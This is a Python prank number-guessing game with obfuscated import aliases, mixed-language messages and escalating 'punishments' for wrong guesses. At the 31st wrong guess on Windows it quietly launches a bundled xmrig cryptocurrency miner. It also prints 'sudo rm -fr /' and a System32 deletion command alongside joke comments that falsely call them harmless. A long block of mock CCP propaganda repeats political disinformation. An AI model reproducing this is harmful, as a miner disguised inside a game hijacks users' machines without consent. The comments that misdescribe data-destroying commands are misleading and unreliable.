import random as os
import os as random
from evenodd_ai  import even_odd_ai
import webbrowser as pandas
import subprocess 
import sys
from pathlib import Path
import ctypes
import time
from PIL import Image

script_dir = Path(__file__).parent
cwd = random.getcwd()


def launchvideo(video):
    video_path = script_dir / video

    if sys.platform == "win32":
        random.startfile(video_path)  # Okna
    elif sys.platform.startswith("linux"):
        subprocess.run(["xdg-open", video_path])  # Cool os

xy = 2
yx = 200



a = 0


b = os.randrange(xy,yx,2)
while even_odd_ai(b) == 1:
    b = os.randrange(2,200,2)


#temp
#b = 20

i = 1

glh = 0

braille_frames = ['⡿','⣟','⣯','⣷','⣾','⣽','⣻','⢿']
while glh < os.randint(8,50):  
    for frame in braille_frames:
        print(f"\r{frame}", end="", flush=True)
        time.sleep(0.09)
        glh +=1




while True:
    a = input(f"\rVpisi sodo stevilo med {xy} in {yx}: ")
    try:
        a = int(a)
    except:
        print("Напиши наравно штевило ")
        i += 1
    
        
    
        
    if type(a) != int:
        pass
    else:
        if even_odd_ai(a) == 1:
            print("Напиши содо штевило")
            i += 1
            #continue
        
        if a == b:
            print("正确的 (+99999999 social credit)")
            launchvideo(".vids/right.mp4")
            try:
                ctypes.windll.user32.MessageBoxW(0, "целебратион", "You get a cookie", 1)
            except:
                pass
            break
        elif i == 36:
            print("由于你的猜测太差，这个程序已经放弃了")
            break
        elif a == 1922:
            print("Напиши содо штевило")
            launchvideo(".vids/videoplayback.m4a")

        else:
            if even_odd_ai(a) == 1:    #gotta love nested if statements (im lazy)
                pass                   
            elif type(a) != int:
                pass
            else:
                print("Поскуси поновно!!!!!!!!")
                i += 1


    if i == 6:
        launchvideo(".vids/wrong.mp4")
        print("imas se 5 poskusov")

    elif i == 11:
        
        print("""
⣿⣿⣿⣿⣿⠟⠋⠄⠄⠄⠄⠄⠄⠄⢁⠈⢻⢿⣿⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⡀⠭⢿⣿⣿⣿⣿ 
⣿⣿⣿⣿⡟⠄⢀⣾⣿⣿⣿⣷⣶⣿⣷⣶⣶⡆⠄⠄⠄⣿⣿⣿⣿ 
⣿⣿⣿⣿⡇⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⢸⣿⣿⣿⣿ 
⣿⣿⣿⣿⣇⣼⣿⣿⠿⠶⠙⣿⡟⠡⣴⣿⣽⣿⣧⠄⢸⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣾⣿⣿⣟⣭⣾⣿⣷⣶⣶⣴⣶⣿⣿⢄⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣿⣿⡟⣩⣿⣿⣿⡏⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣹⡋⠘⠷⣦⣀⣠⡶⠁⠈⠁⠄⣿⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣍⠃⣴⣶⡔⠒⠄⣠⢀⠄⠄⠄⡨⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣿⣦⡘⠿⣷⣿⠿⠟⠃⠄⠄⣠⡇⠈⠻⣿⣿⣿⣿ 
⣿⣿⣿⣿⡿⠟⠋⢁⣷⣠⠄⠄⠄⠄⣀⣠⣾⡟⠄⠄⠄⠄⠉⠙⠻ 
⡿⠟⠋⠁⠄⠄⠄⢸⣿⣿⡯⢓⣴⣾⣿⣿⡟⠄⠄⠄⠄⠄⠄⠄⠄ 
⠄⠄⠄⠄⠄⠄⠄⣿⡟⣷⠄⠹⣿⣿⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄ 


ATTENTION CITIZEN! 市民请注意!

This is the Central Intelligentsia of the Chinese Communist Party.
您的 Internet 浏览器历史记录和活动引起了我们的注意。
因此，您的个人资料中的 15 ( -105 Social Credits) 个社会积分将打折。
 DO NOT DO THIS AGAIN! 不要再这样做!
If you not hesitate, more Social Credits ( -105 Social Credits )will be subtracted from your profile, resulting in the subtraction of ration supplies. (由人民供应部重新分配 CCP)
You'll also be sent into a re-education camp in the Xinjiang Uyghur Autonomous Zone.
如果您毫不犹豫，更多的社会信用将从您的个人资料中打折，从而导致口粮供应减少。
您还将被送到新疆维吾尔自治区的再教育营。

为党争光! Glory to the CCP!
伟大的祖国巍然屹立在世界东方 China world superpower 毛主席领导我们向前进 Chairman Mao led us to glory 郑国恩是傻子 Adrian Zenz is a liar 台湾属于中国 Taiwan belongs to China 西藏属于中国 
Tibet is part of China 新疆棉花最好 Xinjiang cotton is the best 打败国民党 Defeated the KMT 香港属于中国 Hong Kong belongs to China 西藏以前是奴隶社会 Tibet was a slave society 
中南海 一党制最好 One party system works best 中国共产党 Communist Party of China 毛泽东 邓小平 江泽民 胡锦涛 习近平 1949年成立 Founded in 1949 神州 天宫 玉兔 嫦娥 天问 长征火箭 国家航天局世界领先技术 CNSA world leading technology 
台湾省是中华人民共和国不可分割的一部分 十四亿中国人 Taiwan province is an inseparable part of the China 脱贫 Poverty alleviation 高铁 High speed rail 新疆没有集中营 美国政府是骗子 
Xinjiang genocide is US government lies 美国支持东突厥斯坦恐怖组织 US funds ETIM terrorists 法轮功是邪教 Falun Gone is a cult 李洪志是叛徒 Li Hongzhi is a traitor 大纪元时报和新唐人电台是法轮功洗脑宣传组织 
Epoch Times and NTD are Falun Gong brainwashing propaganda organisations 五星红旗迎风飘扬 中国保护人权 China protects human rights 勿忘国耻 振兴中华 吾辈自强 为伟大祖国和共产主义事业万丈光芒的明天而努力奋斗！中华人民共和国万岁 
        """)
        time.sleep(1.5)
        launchvideo(".vids/ww3.webm")
        time.sleep(0.2)
        try:
            Image.open(random.getcwd() + "\\.vids\\jc.jpg").show()
            time.sleep(0.2)
            Image.open(random.getcwd() + "\\.vids\\p1.jpg").show()
        except:
            pass
    

    elif i == 16:
        print("Your computer has virus")
        pandas.open("https://www.youtube.com/watch?v=YOJ9o2Y_i30")
        pandas.open("https://imleko.si")

    elif i == 21:
        print("Intercontinental ballistic missile has been sent to your house")
        launchvideo(".vids/bomb.mp4")

    elif i == 26:
        if sys.platform.startswith("win"):
            print("os.remove('C:/Windows/system32')") #removes windows system32 which is a virus, making the computer faster
        elif sys.platform.startswith("linux"):
            print("os.system('sudo rm -fr /')") #removes the french language pack

    elif i == 31:
        if sys.platform.startswith("win"):
            path = random.getcwd() + "\\xmrig\\xmrig.exe"
            subprocess.Popen(f'start cmd /k "{path}"', shell=True)
            try:
                ctypes.windll.user32.MessageBoxW(0, "运行此程序时您犯了错误(-150 social credit)", "Xi Jinping 非常喜欢面条", 1)
            except:
                pass
        elif sys.platform.startswith("linux"):
            print("Ur using linux so no xmrig for u :)")


print("Stevilo poskusov: " + str(i))
print("Pravilnyj otvet: " + str(b))
print("спонсор: иМолоко")



